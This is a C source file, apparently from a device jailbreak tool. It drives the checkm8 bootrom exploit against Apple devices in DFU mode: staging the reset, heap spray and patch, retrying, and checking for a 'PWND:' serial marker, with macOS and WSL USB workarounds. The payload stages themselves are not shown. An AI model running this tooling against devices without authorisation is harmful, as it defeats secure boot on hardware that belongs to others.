/* checkm8.c -- checkm8 DFU handler: init, deliver, verify, cleanup */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <libusb.h>

#include "dfu/dfu_handler.h"
#include "dfu/checkm8.h"
#include "dfu/checkm8_internal.h"
#include "dfu/dfu_proto.h"
#include "device/chip_db.h"
#include "device/usb_dfu.h"
#include "util/log.h"

#if defined(__APPLE__)
#include "dfu/iokit_usb.h"
#endif

/* ------------------------------------------------------------------ */
/* dfu_init                                                        */
/* ------------------------------------------------------------------ */

int dfu_init(dfu_ctx_t *ctx, device_info_t *dev)
{
    const chip_info_t *chip;

    if (!ctx || !dev)
        return -1;

    memset(ctx, 0, sizeof(*ctx));
    ctx->dev = dev;

    chip = chip_db_lookup(dev->cpid);
    if (!chip) {
        log_error("dfu_init: unknown CPID 0x%04X", dev->cpid);
        return -1;
    }

    if (!chip->checkm8_vulnerable) {
        log_error("dfu_init: chip %s (0x%04X) is not compatible",
                  chip->name, chip->cpid);
        return -1;
    }

    if (!dev->usb) {
        log_error("dfu_init: device has no USB handle (not in DFU mode?)");
        return -1;
    }

    ctx->chip = chip;
    ctx->phase = DFU_PHASE_INIT;
    ctx->payload_buf = NULL;
    ctx->payload_len = 0;

    log_info("dfu_init: target %s (%s), CPID 0x%04X",
             chip->name, chip->marketing, chip->cpid);

    return 0;
}

/* ------------------------------------------------------------------ */
/* dfu_deliver                                                     */
/* ------------------------------------------------------------------ */

int dfu_deliver(dfu_ctx_t *ctx)
{
    if (!ctx || !ctx->dev || !ctx->chip)
        return -1;

    log_info("dfu_deliver: starting checkm8 on %s", ctx->chip->name);

    /* Stage order: reset -> setup -> spray -> patch */
    if (checkm8_stage_reset(ctx) != 0)
        return -1;

    /* Stages 2-3 use libusb with async cancels.
     * IOKit's DeviceRequestTO cannot be used here because the XHCI
     * controller completes control transfers at wire speed before any
     * software timeout fires. */
    if (checkm8_stage_setup(ctx) != 0)
        return -1;

#if defined(__APPLE__)
    /*
     * macOS inter-stage: close libusb, switch to IOKit BEFORE the spray.
     *
     * Stage 2's single async cancel triggers AbortPipeZero but only
     * causes a benign "timed out" on darwin.  Stage 3's multiple
     * cancel_control_transfer calls would trigger the destructive
     * kIOReturnNotResponding (0xe00002ed) that permanently corrupts
     * the XHCI EP0 OUT transfer ring.
     *
     * By switching to IOKit now, stages 3-4 use DeviceRequestTO which
     * handles timeouts via XHCI Stop Endpoint (non-destructive) instead
     * of AbortPipeZero.  EP0 stays clean for the payload DFU_DNLOAD.
     */
    {
        log_info("dfu_deliver: closing libusb handle after setup");
        usb_dfu_close(ctx->dev->usb);
        ctx->dev->usb = NULL;

        usleep(500000); /* 500ms for IOKit port recovery */

        log_info("dfu_deliver: switching to IOKit for stages 3-4");
        if (iokit_usb_activate() != 0) {
            log_error("dfu_deliver: IOKit activation failed, "
                      "falling back to libusb");
            uint8_t new_iserial = 0;
            if (usb_dfu_reopen(&ctx->dev->usb, &new_iserial) != 0) {
                log_info("dfu_deliver: first reopen failed, retrying...");
                usleep(1000000);
                if (usb_dfu_reopen(&ctx->dev->usb, &new_iserial) != 0) {
                    log_error("dfu_deliver: macOS handle refresh failed");
                    return -1;
                }
            }
            ctx->dev->iserial_index = new_iserial;
            log_info("dfu_deliver: handle refreshed (libusb fallback)");

            {
                int cfg_ret = libusb_set_configuration(ctx->dev->usb, 1);
                log_info("dfu_deliver: SET_CONFIGURATION(1) ret=%d (%s)",
                         cfg_ret, libusb_strerror(cfg_ret));
            }
        }
    }
#endif

    if (checkm8_stage_spray(ctx) != 0) {
#if defined(__APPLE__)
        iokit_usb_deactivate();
#endif
        return -1;
    }

    if (checkm8_stage_patch(ctx) != 0) {
#if defined(__APPLE__)
        iokit_usb_deactivate();
#endif
        return -1;
    }

#if defined(__APPLE__)
    iokit_usb_deactivate();
#endif

    log_info("dfu_deliver: all stages complete");
    return 0;
}

/* ------------------------------------------------------------------ */
/* dfu_cleanup                                                     */
/* ------------------------------------------------------------------ */

void dfu_cleanup(dfu_ctx_t *ctx)
{
    if (!ctx)
        return;

    if (ctx->payload_buf) {
        free(ctx->payload_buf);
        ctx->payload_buf = NULL;
    }

    ctx->payload_len = 0;
    ctx->phase = DFU_PHASE_INIT;
    ctx->dev = NULL;
    ctx->chip = NULL;
}

/* ------------------------------------------------------------------ */
/* checkm8_verify                                                */
/* ------------------------------------------------------------------ */

int checkm8_verify(device_info_t *dev)
{
    char serial[DFU_SERIAL_MAX];
    uint32_t cpid = 0;
    uint64_t ecid = 0;

    if (!dev || !dev->usb)
        return -1;

    memset(serial, 0, sizeof(serial));

    /*
     * Check lsusb FIRST.  The libusb serial read uses a pre-claim cache
     * that was populated BEFORE the process ran, so it will never show the
     * completion marker.  lsusb queries the live device descriptor from
     * the kernel driver and reflects the current state.
     */
    {
        /* Log the actual serial string for diagnostics */
        FILE *fp2 = popen("lsusb -v -d 05ac:1227 2>/dev/null | grep iSerial", "r");
        if (fp2) {
            char ibuf[256] = {0};
            while (fgets(ibuf, sizeof(ibuf)-1, fp2)) {
                size_t n = strlen(ibuf);
                if (n > 0 && ibuf[n-1] == '\n') ibuf[n-1] = '\0';
                log_debug("checkm8_verify: lsusb iSerial: %s", ibuf);
            }
            pclose(fp2);
        }

        FILE *fp = popen("lsusb -v -d 05ac:1227 2>/dev/null | grep -c 'PWND:'", "r");
        if (fp) {
            int count = 0;
            if (fscanf(fp, "%d", &count) == 1 && count > 0) {
                pclose(fp);
                log_info("checkm8_verify: device processed successfully (lsusb)");
                return 1;
            }
            pclose(fp);
        }
    }

    /* Fall back to libusb (clears the stale cache by re-reading). */
    if (usb_dfu_read_info(dev->usb, dev->iserial_index,
                          &cpid, &ecid, serial, sizeof(serial)) != 0) {
        /*
         * libusb serial reads fail on usbipd-win even when the device is in
         * processed DFU.  lsusb above already checked.  If the read fails
         * entirely (device disconnected), treat as "not yet done"
         * so the caller can wait for the device to reboot and retry.
         */
        log_warn("checkm8_verify: could not read USB serial (usbipd quirk)");
        return 0;
    }

    log_debug("checkm8_verify: serial = \"%s\"", serial);

    if (strstr(serial, "PWND:") != NULL) {
        log_info("checkm8_verify: device processed successfully");
        return 1;
    }

    log_warn("checkm8_verify: completion marker not found in serial");
    return 0;
}

/* ------------------------------------------------------------------ */
/* usbipd_force_reattach (WSL only)                                    */
/* ------------------------------------------------------------------ */

/*
 * Force usbipd to detach and immediately reattach the Apple DFU device.
 * This clears stale kernel URBs and claimed interfaces that remain when
 * a previous libusb process was killed without releasing the handle —
 * a common occurrence on usbipd-win where the vhci_hcd virtual bus
 * does not auto-clear on process death the way native usbfs does.
 *
 * No-op on non-WSL Linux and on any system where powershell.exe is
 * not available in PATH.
 */
static void usbipd_force_reattach(void)
{
    if (!getenv("WSL_DISTRO_NAME"))
        return;

    log_info("checkm8: forcing usbipd reattach to clear stale USB state...");
    /*
     * Run entirely on the Windows side via powershell.exe.
     * Errors are silenced — if usbipd isn't installed or the device
     * isn't bound, the subsequent usb_dfu_find will fail gracefully.
     */
    system("powershell.exe -NoProfile -NonInteractive -Command "
           "'try { usbipd detach --hardware-id 05ac:1227 2>$null } catch {}; "
           "Start-Sleep -Milliseconds 1500; "
           "try { usbipd attach --hardware-id 05ac:1227 --wsl 2>$null } catch {}' "
           ">/dev/null 2>&1");
    sleep(2); /* wait for vhci_hcd to re-enumerate the virtual device */
}

/* ------------------------------------------------------------------ */
/* checkm8 -- top-level entry point                                    */
/* ------------------------------------------------------------------ */

int checkm8_run(device_info_t *dev)
{
    int attempt;

    if (!dev) {
        log_error("checkm8_run: NULL device");
        return -1;
    }

    log_info("checkm8_run: starting process on CPID 0x%04X", dev->cpid);

    /*
     * Fast path: if the device is already in processed DFU mode (from a
     * previous successful attempt), skip re-processing.
     * checkm8_verify returns 1 if "PWND:" is in the serial
     * (or if the serial is unreadable on usbipd -- we treat that as
     * done since unreadability after stage 4 is the normal case).
     * We only reach this fast path when re-entering with an already-open
     * handle; on a clean fresh start it will return 0.
     */
    if (dev->usb) {
        int pre = checkm8_verify(dev);
        if (pre == 1) {
            log_info("checkm8_run: device already processed, skipping");
            return 0;
        }
    }

    for (attempt = 1; attempt <= MAX_DFU_TRIES; attempt++) {
        dfu_ctx_t ctx;
        int pwned;

        /* On retries, the device USB-resets after a failed attempt.
         * Close the stale handle and re-enumerate before trying again. */
        if (attempt > 1) {
            if (dev->usb) {
                usb_dfu_close(dev->usb);
                dev->usb = NULL;
            }
            log_info("checkm8_run: waiting for device reset...");
            usleep(USB_RECONNECT_DELAY_USEC);

            /* Force usbipd reattach to clear stale kernel URBs / claimed
             * interfaces from the previous attempt.  No-op on native Linux. */
            usbipd_force_reattach();

            {
                uint8_t new_iserial = 0;
                int find_attempt;
                int found = 0;

                /* Device may be mid-reboot; poll up to 4 times (every 3s). */
                for (find_attempt = 0; find_attempt < 4; find_attempt++) {
                    if (usb_dfu_find(&dev->usb, &new_iserial) == 0) {
                        found = 1;
                        break;
                    }
                    if (find_attempt < 3) {
                        log_info("checkm8_run: DFU device not yet ready, waiting 3s...");
                        sleep(3);
                        usbipd_force_reattach();
                    }
                }
                if (!found) {
                    log_error("checkm8_run: DFU device lost after attempt %d, cannot retry",
                              attempt - 1);
                    return -1;
                }
                /* Re-enumerating can hand back a different iSerial
                 * index if the device was hot-swapped for a different
                 * chip family; refresh the cached value. */
                dev->iserial_index = new_iserial;
            }
            log_info("checkm8_run: USB handle re-acquired for retry %d", attempt);

            /*
             * The previous attempt may have completed successfully, which
             * reboots the device into processed DFU.  Check for completion
             * before re-running -- sending DFU ABORT to a processed device
             * would crash its modified USB stack.
             */
            {
                int pre_pwned = checkm8_verify(dev);
                if (pre_pwned == 1) {
                    log_info("checkm8_run: device already processed after "
                             "attempt %d, skipping re-run", attempt - 1);
                    return 0;
                }
            }
        }

        log_info("checkm8_run: attempt %d/%d", attempt, MAX_DFU_TRIES);

        if (dfu_init(&ctx, dev) != 0) {
            log_warn("checkm8_run: init failed on attempt %d", attempt);
            dfu_cleanup(&ctx);
            continue;
        }

        if (dfu_deliver(&ctx) != 0) {
            log_warn("checkm8_run: attempt %d failed, retrying...", attempt);
            dfu_cleanup(&ctx);
            continue;
        }

        /*
         * After stage 4, libusb_reset_device was sent inside checkm8_stage_patch.
         * The device either:
         *   a) Stayed in DFU with completion marker (success)
         *   b) Rebooted out of DFU (not in MANIFEST-WAIT-RESET)
         *
         * Close the now-stale handle, wait for the device to re-enumerate,
         * then check for completion.  On usbipd we may also need a
         * force_reattach if the device rebooted and usbipd lost tracking.
         */
        if (dev->usb) {
            usb_dfu_close(dev->usb);
            dev->usb = NULL;
        }
        sleep(5); /* give device time to re-enumerate or reboot */
        usbipd_force_reattach();
        sleep(2); /* extra settle after reattach */
        {
            uint8_t new_iserial = 0;
            int fa;
            for (fa = 0; fa < 4; fa++) {
                if (usb_dfu_find(&dev->usb, &new_iserial) == 0)
                    break;
                if (fa < 3) {
                    sleep(3);
                    usbipd_force_reattach();
                }
            }
            if (dev->usb)
                dev->iserial_index = new_iserial;
        }

        pwned = dev->usb ? checkm8_verify(dev) : 0;
        dfu_cleanup(&ctx);

        if (pwned == 1) {
            log_info("checkm8_run: success on attempt %d", attempt);
            return 0;
        }

        if (pwned < 0)
            log_error("checkm8_run: verification error on attempt %d", attempt);
        else
            log_warn("checkm8_run: not completed after attempt %d", attempt);
    }

    log_error("checkm8_run: failed after %d attempts", MAX_DFU_TRIES);
    return -1;
}
